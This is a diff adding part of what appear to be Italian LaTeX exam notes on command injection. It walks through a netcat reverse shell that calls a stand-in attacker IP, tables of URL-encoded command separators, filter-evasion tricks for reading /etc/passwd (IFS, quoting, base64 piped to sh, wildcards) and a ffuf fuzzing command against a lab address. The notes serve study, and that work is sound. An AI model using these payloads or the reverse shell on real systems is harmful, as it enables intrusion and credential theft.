+		\item \textbf{\texttt{\textbar{} nc \textless{}IP\_ATTACCANTE\textgreater{} 4444}} $\rightarrow$ Riceve l'output della shell interattiva (compresi i messaggi di errore) e lo passa a Netcat. Netcat apre una connessione di rete TCP \textit{outbound} verso l'indirizzo IP dell'attaccante sulla porta specificata (es. 4444). 
+		\item \textbf{\texttt{\textgreater{}/tmp/f}} $\rightarrow$ Redirige lo Standard Output di Netcat (ovvero i comandi testuali che l'attaccante digiterà sulla propria macchina di controllo) e li scrive nuovamente all'interno della named pipe iniziale \texttt{/tmp/f}.
+	\end{itemize}
+	
+	\begin{tcolorbox}[colback=white, colframe=black, title=\textbf{Meccanismo a Ciclo Continuo (Anello)}]
+		Il flusso dei dati forma un cerchio perfetto: l'attaccante invia un comando via \texttt{nc} $\rightarrow$ \texttt{nc} writes the command in \texttt{/tmp/f} $\rightarrow$ \texttt{cat} legge \texttt{/tmp/f} e lo passa alla shell \texttt{/bin/sh} $\rightarrow$ la shell esegue il comando $\rightarrow$ l'output del comando viene ripreso da \texttt{nc} e rispedito sullo schermo dell'attaccante.
+	\end{tcolorbox}
+	
+	\subsection{Separatori di Comandi e URL Encoding}
+	
+	Poiché l'attacco avviene quasi sempre tramite richieste HTTP (GET o POST), \textbf{tutti i caratteri speciali devono essere mappati con il corretto URL Encoding} per evitare che il browser o il server web li interpretino in modo errato.
+	
+	\begin{table}[h!]
+		\centering
+		\begin{tabular}{|c|c|p{9cm}|}
+			\hline
+			\textbf{Carattere Shell} & \textbf{URL Encoded} & \textbf{Comportamento nella Shell} \\ \hline
+			\texttt{;} & \texttt{\%3B} & Esegue entrambi i comandi in sequenza ordinaria. \\ \hline
+			\texttt{\textbar} & \texttt{\%7C} & \textbf{Pipe:} Invia lo stdout del primo comando allo stdin del secondo. \\ \hline
+			\texttt{\&} & \texttt{\%26} & Esegue il primo comando in background e passa subito al secondo. \\ \hline
+			\texttt{\&\&} & \texttt{\%26\%26} & Esegue il secondo comando \textbf{SOLO SE} il primo ha successo (exit code 0). \\ \hline
+			\texttt{\textbar\textbar} & \texttt{\%7C\%7C} & Esegue il secondo comando \textbf{SOLO SE} il primo fallisce (exit code != 0). \\ \hline
+			\texttt{\textbackslash n} (Newline) & \texttt{\%0a} & \textbf{A capo:} Equivale a premere Invio. Spesso bypassa i filtri basati su regex primitive. \\ \hline
+			\texttt{\textasciigrave{}comando\textasciigrave{}} & \texttt{\%60...\%60} & \textbf{Backtick:} Esegue il comando in una subshell e sostituisce la stringa con l'output. \\ \hline
+			\texttt{\$(comando)} & \texttt{\%24\%28...\%29} & \textbf{Subshell:} Equivalente moderno dei backtick (più facile da concatenare). \\ \hline
+		\end{tabular}
+		\caption{Separatori di comandi e relative codifiche URL.}
+	\end{table}
+	
+	\subsection{Tecniche di Evasione (Bypass dei Filtri)}
+	
+	Se il payload base (es. \texttt{; cat /etc/passwd}) viene bloccato, il server sta applicando dei filtri sull'input. Utilizzare le seguenti tecniche in ordine progressivo.
+	
+	\subsubsection{A. Bypass degli Spazi}
+	Se il filtro blocca il carattere spazio (restituendo errori o troncando il comando):
+	
+	\begin{table}[h!]
+		\centering
+		\begin{tabular}{|l|l|p{7cm}|}
+			\hline
+			\textbf{Tecnica Bash} & \textbf{URL Encoded} & \textbf{Esempio Pratico} \\ \hline
+			\textbf{Variabile IFS} & \texttt{\$\{IFS\}} & \texttt{cat\$\{IFS\}/etc/passwd} \\ \hline
+			\textbf{Ridirezione Input} & \texttt{\textless} & \texttt{cat\textless{}/etc/passwd} (Funziona solo per comandi che leggono file) \\ \hline
+			\textbf{Brace Expansion} & \texttt{\{cmd,arg1\}} & \texttt{\{cat,/etc/passwd\}} \\ \hline
+		\end{tabular}
+		\caption{Metodi di bypass per il blocco del carattere spazio.}
+	\end{table}
+	
+	\subsubsection{B. Bypass del Nome del Comando (Evasione Stringhe "cat", "id", ecc.)}
+	Se il filtro esegue un controllo testuale statico sulle parole chiave:
+	
+	\begin{table}[h!]
+		\centering
+		\begin{tabular}{|l|p{6cm}|l|}
+			\hline
+			\textbf{Tecnica Shell} & \textbf{Meccanismo} & \textbf{Esempio Risultante} \\ \hline
+			\textbf{Apici intermedi} & Vengono rimossi dalla shell prima dell'esecuzione dell'istruzione & \texttt{c'a't /etc/passwd} \\ \hline
+			\textbf{Backslash} & Invalida il matching statico della stringa sulle regex di controllo & \texttt{c\textbackslash at /etc/passwd} \\ \hline
+			\textbf{Variabili Vuote} & Sfrutta i caratteri \texttt{\$@} o variabili d'ambiente non istanziate & \texttt{ca\$@t /etc/passwd} o \texttt{ca\$\{x\}t} \\ \hline
+			\textbf{Concatenazione} & Definizione ed esecuzione sequenziale di variabili locali & \texttt{X=ca; Y=t; \$X\$Y /etc/passwd} \\ \hline
+			\textbf{Base64} & Il comando viaggia interamente offuscato e viene decodificato al volo & \texttt{echo '...' \textbar{} base64 -d \textbar{} sh} \\ \hline
+		\end{tabular}
+		\caption{Tecniche di offuscamento delle stringhe dei comandi.}
+	\end{table}
+	
+	\subsubsection{C. Bypass del Path / Nome File (Evasione di "/etc/passwd")}
+	Se il filtro blocca l'accesso a file specifici o interdice l'uso della barra \texttt{/}:
+	\begin{itemize}
+		\item \textbf{Wildcard (\texttt{*} e \texttt{?}):} La shell expands i caratteri prima di eseguire il comando.
+		\begin{itemize}
+			\item \texttt{/etc/pass*} $\rightarrow$ punta a \texttt{/etc/passwd}
+			\item \texttt{/etc/passw?d} $\rightarrow$ punta a \texttt{/etc/passwd}
+			\item \texttt{/usr/bin/id} $\rightarrow$ \texttt{/usr/bin/i?}
+		\end{itemize}
+		\item \textbf{Range di caratteri (\texttt{[...]}):}
+		\begin{itemize}
+			\item \texttt{/etc/passw[a-z]d} $\rightarrow$ punta a \texttt{/etc/passwd}
+		\end{itemize}
+	\end{itemize}
+	
+	\subsection{Automazione Avanzata: Generazione Wordlist + ffuf}
+	
+	Per massimizzare l'efficienza nell'esame openbook, è possibile configurare lo script custom \texttt{cmd\_obfuscator.sh} in modo che generi una lista pulita di payload offuscati (senza scritte decorative), salvando il risultato direttamente in una wordlist mirata per \texttt{ffuf}.
+	
+	\subsubsection{1. Preparazione della Wordlist personalizzata}
+	Esegui lo script reindirizzando l'output su file:
+	\begin{lstlisting}[backgroundcolor=\color{codegray}, basicstyle=\ttfamily\small, breaklines=true]
+		./cmd_obfuscator.sh "cat /etc/passwd" > wordlist_cmd.txt
+	\end{lstlisting}
+	
+	\subsubsection{2. Attacco con ffuf (Fuzzing dell'endpoint vulnerabile)}
+	Usa il fuzzer per inviare la lista di payload offuscati contro il parametro vulnerabile dell'URL.
+	\begin{lstlisting}[backgroundcolor=\color{codegray}, basicstyle=\ttfamily\small, breaklines=true]
+		ffuf -w wordlist_cmd.txt -u "http://10.3.3.1:5000/browse/stat?filepath=FUZZ" -fs 1250
+	\end{lstlisting}
+	\begin{itemize}
+		\item \textbf{Meccanismo:} \texttt{ffuf} sostituirà la parola chiave \texttt{FUZZ} con ogni singola riga della tua wordlist personalizzata.
+		\item \textbf{Filtro \texttt{-fs}:} Fondamentale per nascondere le risposte di errore standard (es. se la pagina di errore o di blocco del server ha una dimensione fissa di 1250 byte, inserisci \texttt{-fs 1250}). L'unico payload che emergerà sarà quello che mostra a schermo il file, determinando una variazione della dimensione della risposta HTTP.
+	\end{itemize}
 	
 \end{document}
